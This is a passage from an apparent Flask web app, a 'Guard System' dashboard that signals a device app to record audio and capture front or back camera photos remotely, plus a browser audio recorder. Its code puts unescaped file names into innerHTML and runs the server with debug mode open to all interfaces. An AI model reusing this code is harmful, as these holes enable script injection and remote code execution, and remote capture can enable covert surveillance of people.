                    setTimeout(() => stopRecording(), 30000);
                }
            })
            .catch(err => console.error('Error:', err));
        }

        function stopRecording() {
            if(signalCheckInterval) clearInterval(signalCheckInterval);
            document.getElementById('signalStatus').className = 'signal-status signal-inactive';
            document.getElementById('signalStatus').textContent = 'Signal: Inactive';
            document.getElementById('recordingInfo').textContent = '';
        }

        function checkSignalStatus() {
            fetch('/check-signal')
            .then(r => r.json())
            .then(data => {
                if(!data.record) stopRecording();
            });
        }

        // Camera Functions
        function startCamera(cameraType) {
            const cameraName = cameraType === 'front' ? 'Front' : 'Back';
            document.getElementById('cameraInfo').textContent = `${cameraName} camera signal sent to app`;
            
            fetch('/start-camera-signal', { 
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ camera_type: cameraType })
            })
            .then(r => r.json())
            .then(data => {
                if(data.ok) {
                    document.getElementById('cameraStatus').className = 'signal-status camera-active';
                    document.getElementById('cameraStatus').textContent = `Camera: ${cameraName} Active`;
                    
                    cameraCheckInterval = setInterval(checkCameraStatus, 2000);
                    setTimeout(() => {
                        stopCamera();
                        setTimeout(refreshPhotos, 3000);
                    }, 30000);
                }
            })
            .catch(err => console.error('Error:', err));
        }

        function stopCamera() {
            if(cameraCheckInterval) clearInterval(cameraCheckInterval);
            document.getElementById('cameraStatus').className = 'signal-status signal-inactive';
            document.getElementById('cameraStatus').textContent = 'Camera: Inactive';
            document.getElementById('cameraInfo').textContent = '';
        }

        function checkCameraStatus() {
            fetch('/check-camera-signal')
            .then(r => r.json())
            .then(data => {
                if(!data.capture) {
                    stopCamera();
                    setTimeout(refreshPhotos, 2000);
                }
            });
        }

        function openPhoto(photoUrl) {
            window.open(photoUrl, '_blank');
        }

        // Photo Gallery Functions
        function refreshPhotos() {
            console.log("🔄 Refreshing photos...");
            fetch('/get-latest-photos')
            .then(r => {
                console.log("📡 Photos API response status:", r.status);
                return r.json();
            })
            .then(data => {
                console.log("📸 Photos data received:", data);
                if(data.ok) {
                    const gallery = document.getElementById('photoGallery');
                    console.log("📸 Number of photos:", data.photos.length);
                    
                    if(data.photos.length === 0) {
                        gallery.innerHTML = '<div style="grid-column:1/-1;text-align:center;padding:40px;color:#666;">📷 No photos captured yet. Click camera buttons above to capture photos.</div>';
                        return;
                    }
                    
                    gallery.innerHTML = data.photos.map(photo => `
                        <div class="photo-item">
                            <img src="${photo.url}?t=${new Date().getTime()}" 
                                 onclick="openPhoto('${photo.url}')" 
                                 alt="${photo.name}"
                                 onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjE1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjMzMzIi8+PHRleHQgeD0iNTAlIiB5PSI1MCUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCIgZmlsbD0iIzk5OSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZHk9Ii4zZW0iPlBob3RvIEVycm9yPC90ZXh0Pjwvc3ZnPg=='; console.error('Image load error:', '${photo.url}')">
                            <div class="photo-info">
                                <div class="photo-name">${photo.name}</div>
                                <div class="photo-size">${Math.round(photo.size / 1024)} KB</div>
                            </div>
                        </div>
                    `).join('');
                } else {
                    console.error("❌ Photos API error:", data);
                }
            })
            .catch(err => {
                console.error("❌ Error refreshing photos:", err);
                const gallery = document.getElementById('photoGallery');
                gallery.innerHTML = '<div style="grid-column:1/-1;text-align:center;padding:40px;color:red">❌ Error loading photos. Check console.</div>';
            });
        }

        // Auto-refresh photos every 10 seconds
        setInterval(refreshPhotos, 10000);

        // Load photos on page load
        document.addEventListener('DOMContentLoaded', function() {
            refreshPhotos();
        });

        // Update recording info when input changes
        document.getElementById('recordTime').addEventListener('change', function() {
            const time = parseInt(this.value) || 15;
            if (time < 5) this.value = 5;
            if (time > 60) this.value = 60;
        });

        // Add some cool hover effects
        document.addEventListener('DOMContentLoaded', function() {
            const buttons = document.querySelectorAll('.btn, .btn-control, .btn-small');
            buttons.forEach(btn => {
                btn.addEventListener('mouseenter', function() {
                    this.style.transform = 'translateY(-3px)';
                });
                
                btn.addEventListener('mouseleave', function() {
                    this.style.transform = 'translateY(0)';
                });
            });
        });
    </script>
</body>
</html>
"""

# RECORDER PAGE (Black Theme)
RECORDER_HTML = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎤 Audio Recorder - Guard System</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 50%, #2d2d2d 100%);
            color: #ffffff;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        
        .back-btn {
            background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
            color: white;
            padding: 12px 25px;
            border: none;
            border-radius: 12px;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 30px;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        
        .back-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
        }
        
        .recorder-card {
            background: rgba(25, 25, 25, 0.95);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
        }
        
        .recorder-header {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .recorder-header h1 {
            color: #00b7ff;
            font-size: 2.5rem;
            font-weight: 700;
            text-shadow: 0 0 20px rgba(0, 183, 255, 0.5);
            margin-bottom: 10px;
        }
        
        .recorder-header p {
            color: #888;
            font-size: 1.1rem;
        }
        
        .controls {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-bottom: 30px;
            flex-wrap: wrap;
        }
        
        .btn {
            padding: 16px 30px;
            border: none;
            border-radius: 12px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .btn-record {
            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
            color: white;
        }
        
        .btn-stop {
            background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
            color: white;
        }
        
        .btn-upload {
            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
            color: white;
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
        }
        
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .status {
            text-align: center;
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 30px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .recording {
            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
            box-shadow: 0 0 20px rgba(220, 53, 69, 0.5);
        }
        
        .not-recording {
            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
        }
        
        .visualizer {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 30px;
            height: 120px;
        }
        
        canvas {
            width: 100%;
            height: 100%;
            border-radius: 8px;
        }
        
        .audio-playback {
            width: 100%;
            margin-top: 20px;
            border-radius: 25px;
        }
        
        .pulse {
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <a href="/" class="back-btn">← Back to Dashboard</a>
        
        <div class="recorder-card">
            <div class="recorder-header">
                <h1>🎤 AUDIO RECORDER</h1>
                <p>Record and upload audio files directly from your browser</p>
            </div>
            
            <div class="controls">
                <button class="btn btn-record" onclick="startRecording()">● Start Recording</button>
                <button class="btn btn-stop" onclick="stopRecording()" disabled>■ Stop</button>
                <button class="btn btn-upload" onclick="uploadRecording()" disabled>📤 Upload</button>
            </div>
            
            <div id="status" class="status not-recording">Ready to Record</div>
            
            <div class="visualizer">
                <canvas id="canvas" width="760" height="100"></canvas>
            </div>
            
            <audio id="audioPlayback" controls class="audio-playback"></audio>
        </div>
    </div>

    <script>
        let mediaRecorder;
        let audioChunks = [];
        let audioContext;
        let analyser;
        let canvasCtx;
        let isRecording = false;

        const recordBtn = document.querySelector('.btn-record');
        const stopBtn = document.querySelector('.btn-stop');
        const uploadBtn = document.querySelector('.btn-upload');
        const statusSpan = document.getElementById('status');
        const canvas = document.getElementById('canvas');
        const audioPlayback = document.getElementById('audioPlayback');

        canvasCtx = canvas.getContext('2d');

        async function startRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                
                audioContext = new (window.AudioContext || window.webkitAudioContext)();
                analyser = audioContext.createAnalyser();
                const source = audioContext.createMediaStreamSource(stream);
                source.connect(analyser);
                analyser.fftSize = 256;
                
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];
                
                mediaRecorder.ondataavailable = event => {
                    audioChunks.push(event.data);
                };
                
                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/mp4' });
                    const audioUrl = URL.createObjectURL(audioBlob);
                    audioPlayback.src = audioUrl;
                    uploadBtn.disabled = false;
                };
                
                mediaRecorder.start();
                isRecording = true;
                
                recordBtn.disabled = true;
                stopBtn.disabled = false;
                uploadBtn.disabled = true;
                statusSpan.textContent = '🎙️ Recording...';
                statusSpan.className = 'status recording pulse';
                
                visualize();
                
            } catch (err) {
                console.error('Error starting recording:', err);
                alert('❌ Error accessing microphone. Please check permissions.');
            }
        }

        function stopRecording() {
            if (mediaRecorder && isRecording) {
                mediaRecorder.stop();
                isRecording = false;
                
                recordBtn.disabled = false;
                stopBtn.disabled = true;
                statusSpan.textContent = '✅ Recording Complete';
                statusSpan.className = 'status not-recording';
                statusSpan.classList.remove('pulse');
                
                mediaRecorder.stream.getTracks().forEach(track => track.stop());
            }
        }

        function uploadRecording() {
            if (audioChunks.length === 0) {
                alert('❌ No recording to upload');
                return;
            }
            
            const audioBlob = new Blob(audioChunks, { type: 'audio/mp4' });
            const formData = new FormData();
            formData.append('audio', audioBlob, 'recording_' + Date.now() + '.m4a');
            
            statusSpan.textContent = '📤 Uploading...';
            statusSpan.className = 'status recording';
            
            fetch('/upload', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    statusSpan.textContent = '✅ Upload Successful!';
                    statusSpan.className = 'status not-recording';
                    uploadBtn.disabled = true;
                } else {
                    statusSpan.textContent = '❌ Upload Failed';
                    statusSpan.className = 'status recording';
                    alert('Upload failed: ' + data.error);
                }
            })
            .catch(err => {
                console.error('Upload error:', err);
                statusSpan.textContent = '❌ Upload Failed';
                statusSpan.className = 'status recording';
                alert('Upload failed');
            });
        }

        function visualize() {
            if (!isRecording) return;
            
            const bufferLength = analyser.frequencyBinCount;
            const dataArray = new Uint8Array(bufferLength);
            
            function draw() {
                if (!isRecording) return;
                
                requestAnimationFrame(draw);
                analyser.getByteFrequencyData(dataArray);
                
                canvasCtx.fillStyle = 'rgba(10, 10, 10, 0.1)';
                canvasCtx.fillRect(0, 0, canvas.width, canvas.height);
                
                const barWidth = (canvas.width / bufferLength) * 2.5;
                let barHeight;
                let x = 0;
                
                for (let i = 0; i < bufferLength; i++) {
                    barHeight = dataArray[i] / 2;
                    
                    const gradient = canvasCtx.createLinearGradient(0, canvas.height - barHeight, 0, canvas.height);
                    gradient.addColorStop(0, '#00b7ff');
                    gradient.addColorStop(1, '#0099cc');
                    
                    canvasCtx.fillStyle = gradient;
                    canvasCtx.fillRect(x, canvas.height - barHeight, barWidth, barHeight);
                    
                    x += barWidth + 1;
                }
            }
            
            draw();
        }

        // Add button hover effects
        document.addEventListener('DOMContentLoaded', function() {
            const buttons = document.querySelectorAll('.btn');
            buttons.forEach(btn => {
                btn.addEventListener('mouseenter', function() {
                    if (!this.disabled) {
                        this.style.transform = 'translateY(-3px)';
                    }
                });
                
                btn.addEventListener('mouseleave', function() {
                    this.style.transform = 'translateY(0)';
                });
            });
        });
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
